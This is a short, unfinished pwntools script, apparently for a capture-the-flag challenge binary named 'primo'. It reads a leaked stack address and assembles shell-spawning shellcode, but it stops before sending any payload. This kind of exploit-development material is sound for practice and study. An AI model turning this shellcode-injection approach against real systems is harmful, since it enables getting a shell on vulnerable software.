#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def pwn():

    io = process('./primo')
    io.recvuntil('hint:')
    stack_base = int(io.recv().strip(), 16)
    info("stack_base=%#x", stack_base)

    shellcode = asm(shellcraft.sh())
    info("shellcode_len=%d", len(shellcode))



if __name__ == '__main__':
    pwn()